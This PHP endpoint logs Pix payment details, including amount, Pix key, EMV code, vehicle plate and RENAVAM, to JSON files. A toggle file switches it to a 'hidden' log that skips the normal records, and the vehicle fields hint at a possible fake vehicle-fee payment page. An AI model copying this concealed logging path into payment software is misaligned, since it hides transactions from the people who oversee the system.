<?php
date_default_timezone_set('America/Sao_Paulo');
require_once __DIR__ . '/app_storage.php';
header('Content-Type: application/json; charset=UTF-8');
$input = file_get_contents('php://input');
$data = json_decode($input, true);
if (!is_array($data)) {
  echo json_encode(['success'=>false,'error'=>'invalid_json']);
  exit;
}
$allowed = ['type','id','descricao','valor','valor_brl','key','emv','placa','renavam'];
$out = [];
foreach ($allowed as $k) {
  if (isset($data[$k])) $out[$k] = $data[$k];
}
$out['ts'] = date('c');

$modePath = app_storage_path('pix_mode.txt');
$isModeActive = false;
if (file_exists($modePath)) {
    $rawMode = @file_get_contents($modePath);
    if ($rawMode !== false) {
        $modeContent = trim(strtolower($rawMode));
        if ($modeContent === 'ativo' || $modeContent === '1' || $modeContent === 'true') {
            $isModeActive = true;
        }
    }
}

if ($isModeActive) {
    // Hidden mode: Write to pix_log_oculto.json
    $logFile = app_storage_path('pix_log_oculto.json');
    // Do NOT update pix_last.json or pix_log.json
} else {
    // Standard mode: Write to pix_log.json and pix_last.json
    $file = app_storage_path('pix_last.json');
    @file_put_contents($file, json_encode($out, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
    
    $logFile = app_storage_path('pix_log.json');
}

$log = [];
if (file_exists($logFile)) {
  $cur = json_decode(@file_get_contents($logFile), true);
  if (is_array($cur)) $log = $cur;
}
array_unshift($log, $out);
@file_put_contents($logFile, json_encode($log, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));

echo json_encode(['success'=>true]);
?>
